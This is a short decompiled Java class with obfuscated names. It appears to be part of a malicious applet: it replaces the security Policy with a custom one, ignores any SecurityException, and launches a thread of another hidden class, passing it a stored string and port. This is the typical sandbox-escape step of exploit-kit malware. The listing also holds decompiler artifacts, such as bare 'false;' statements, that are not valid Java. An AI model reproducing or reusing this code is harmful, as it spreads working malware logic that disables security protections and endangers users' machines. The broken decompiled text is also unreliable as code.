import java.security.Policy;
import java.security.PrivilegedAction;

// 
// Decompiled by Procyon v0.5.30
// 

public class g6k1 implements PrivilegedAction
{
    Boolean lioqaa;
    byte rxean;
    String __v;
    Boolean eofeudyma;
    String opoeheyb;
    int port;
    String uyiwyo;
    
    @Override
    public Object run() {
        try {
            Policy.setPolicy(new g5z6());
            false;
        }
        catch (SecurityException ex) {}
        final Thread thread = new Thread(new h6l4(this.__v));
        false;
        thread.start();
        return main.coder("*&") + main.coder("$'");
    }
    
    public g6k1(final String _v, final int port) {
        this.lioqaa = false;
        this.rxean = 14;
        this.eofeudyma = false;
        this.opoeheyb = "_5b7a242e02f";
        this.uyiwyo = "_d590bb";
        this.__v = _v;
        false;
        this.port = port;
    }
}
